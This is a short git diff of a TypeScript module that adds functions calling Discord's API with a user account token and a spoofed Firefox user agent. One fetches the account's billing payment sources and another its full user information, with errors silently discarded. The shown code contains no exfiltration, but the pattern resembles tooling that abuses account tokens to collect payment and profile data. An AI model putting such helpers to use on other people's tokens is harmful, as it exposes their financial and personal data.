@@ -1,5 +1,6 @@
 import fetch from "node-fetch";
 import axios, { AxiosError } from "axios";
+import { IFullUserInfo } from "../interfaces/ISocketEvents";
 
 const USER_AGENT =
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0";
@@ -99,6 +100,20 @@ export const sendMessageAxios = async (
 export const getBillingInforationAxios = async (token: string) =>
   axios
     .get(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
+      headers: {
+        "Content-type": "application/json; charset=UTF-8",
+        "User-Agent": USER_AGENT,
+        Authorization: token,
+      },
+    })
+    .then((res) => res.data)
+    .catch((_) => {});
+
+export const getUserInformationAxios = async (
+  token: string
+): Promise<IFullUserInfo> =>
+  axios
+    .get(`https://discord.com/api/v9/users/@me`, {
       headers: {
         "Content-type": "application/json; charset=UTF-8",
         "User-Agent": USER_AGENT,
